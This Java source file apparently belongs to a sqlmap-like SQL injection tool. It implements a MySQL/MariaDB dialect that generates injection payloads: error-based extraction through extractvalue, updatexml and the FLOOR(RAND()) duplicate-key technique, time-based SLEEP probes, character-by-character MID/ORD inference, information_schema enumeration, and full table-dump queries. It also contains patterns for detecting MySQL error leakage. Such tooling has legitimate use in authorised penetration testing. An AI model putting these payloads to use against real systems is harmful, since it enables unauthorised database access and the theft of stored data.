package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * MySQL / MariaDB dialect for OmniMap.
 * Uses information_schema, MID(), CHAR(), SLEEP(), IF(), extractvalue/updatexml for errors.
 */
public class MysqlDialect implements DbmsDialect {

    /**
     * Random hex markers for error-based extraction (like sqlmap's kb.chars.start/stop).
     * sqlmap generates random 4-byte hex strings like 0x716b7871 and 0x7170787871.
     * These are unique per session to avoid false positives.
     */
    private final String errorHexPrefix;
    private final String errorHexSuffix;
    /** Decoded string forms for regex matching in ErrorExtractor */
    private final String errorPrefixDecoded;
    private final String errorSuffixDecoded;

    public MysqlDialect() {
        this.errorHexPrefix = randomHex(4);
        this.errorHexSuffix = randomHex(5);
        this.errorPrefixDecoded = decodeHex(errorHexPrefix);
        this.errorSuffixDecoded = decodeHex(errorHexSuffix);
    }

    public String getErrorPrefixDecoded() { return errorPrefixDecoded; }
    public String getErrorSuffixDecoded() { return errorSuffixDecoded; }

    private static String randomHex(int byteCount) {
        StringBuilder sb = new StringBuilder("0x");
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        for (int i = 0; i < byteCount; i++) {
            // sqlmap uses printable chars (0x71-0x78 range), we do the same
            sb.append(String.format("%02x", rng.nextInt(0x71, 0x79)));
        }
        return sb.toString();
    }

    private static String decodeHex(String hex) {
        String raw = hex.startsWith("0x") ? hex.substring(2) : hex;
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < raw.length(); i += 2) {
            sb.append((char) Integer.parseInt(raw.substring(i, i + 2), 16));
        }
        return sb.toString();
    }

    @Override
    public String getName() { return "MySQL"; }

    @Override
    public String currentDatabase() {
        return "SELECT database()";
    }

    @Override
    public String listDatabases() {
        return "SELECT schema_name FROM information_schema.schemata";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM information_schema.tables WHERE table_schema='" + database + "'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM information_schema.columns WHERE table_schema='" + database
                + "' AND table_name='" + table + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "IFNULL(CAST(`" + c + "` AS CHAR),0x20)")
                .collect(Collectors.joining(",0x7c,"));
        return "SELECT CONCAT(" + cols + ") FROM `" + database + "`.`" + table
                + "` LIMIT " + limit + " OFFSET " + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHAR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "MID((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "SLEEP(" + seconds + ")";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "IF(" + condition + "," + trueVal + "," + falseVal + ")";
    }

    @Override
    public String commentSuffix() {
        return "-- -";
    }

    @Override
    public String concatenate(String... parts) {
        return "CONCAT(" + String.join(",", parts) + ")";
    }

    @Override
    public List<String> errorFunctions() {
        // Use random hex markers like sqlmap (e.g. 0x716b7871...data...0x7170787871)
        return List.of(
                "extractvalue(1,concat(" + errorHexPrefix + ",(%s)," + errorHexSuffix + "))",
                "updatexml(1,concat(" + errorHexPrefix + ",(%s)," + errorHexSuffix + "),1)",
                "(SELECT 1 FROM (SELECT COUNT(*),CONCAT((%s)," + errorHexSuffix + ",FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
        );
    }

    @Override
    public List<Pattern> errorPatterns() {
        return List.of(
                Pattern.compile("You have an error in your SQL syntax", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Warning.*mysql_", Pattern.CASE_INSENSITIVE),
                Pattern.compile("MySQLSyntaxErrorException", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQLSTATE\\[.*\\].*MySQL", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unclosed quotation mark", Pattern.CASE_INSENSITIVE),
                Pattern.compile("check the manual that corresponds to your (MySQL|MariaDB)", Pattern.CASE_INSENSITIVE),
                Pattern.compile("XPATH syntax error:\\s*'~", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Duplicate entry '.*' for key", Pattern.CASE_INSENSITIVE)
        );
    }

    @Override
    public String asciiAtPosition(String expr, int pos) {
        // sqlmap uses ORD() for MySQL, not ASCII(). ORD() handles multi-byte chars.
        return "ORD(" + substringFunction(expr, pos, 1) + ")";
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM `" + database + "`.`" + table + "`";
    }
}
